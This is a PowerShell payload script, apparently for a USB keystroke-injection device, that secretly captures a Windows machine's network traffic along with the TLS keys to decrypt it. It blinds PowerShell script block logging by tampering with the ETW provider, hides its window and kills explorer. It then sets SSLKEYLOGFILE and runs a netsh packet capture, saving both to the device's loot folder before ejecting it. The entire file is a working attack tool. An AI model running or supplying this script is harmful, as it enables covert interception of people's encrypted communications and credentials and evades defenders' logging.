#
# Author:       TW-D
# Version:      1.0
#

Param (
    [String] $BB_VOLUME,
    [Int] $SNIFFING_TIME
)

# Partially avoids "PowerShell Script Block Logging".
#
$etw_provider = [Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Static")
$event_provider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etw_provider.SetValue($null, $event_provider)

# Closing of all windows.
#
Get-Process -Name "explorer" | Stop-Process
    
# Hide "PowerShell" window.
#
$Script:showWindowAsync = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null

# Check if current process have "Administrator" privilege.
#
If ( ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") ) {

    $bb_loot = "${BB_VOLUME}loot\"
    
    # Sets the "SSLKEYLOGFILE" environment variable to store SSL session key information.
    #
    [Environment]::SetEnvironmentVariable("SSLKEYLOGFILE", $null, "User")
    [Environment]::SetEnvironmentVariable("SSLKEYLOGFILE", "${bb_loot}SSLKEYLOGFILE.txt", "User")

    # Starts a "Network Tracing Session" with "ETW (Event Tracing for Windows)".
    #
    (NETSH trace start capture=yes report=no persistent=yes traceFile="${bb_loot}capture.etl" maxSize=0 fileMode=append) | Out-Null
    Start-Sleep -Seconds $SNIFFING_TIME
    (NETSH trace stop) | Out-Null

    [Environment]::SetEnvironmentVariable("SSLKEYLOGFILE", $null, "User")

}

"Win_SSLKeyLog terminated." | Out-File -FilePath .\..\..\loot\done.txt -Force

# Writes the file system cache to disk (thanks to @dark_pyrro).
#
Write-VolumeCache -DriveLetter ("${BB_VOLUME}".Substring(0,1))

# Safely eject (thanks to @Night (9o3)).
#
(New-Object -ComObject Shell.Application).Namespace(17).ParseName("${BB_VOLUME}").InvokeVerb("Eject")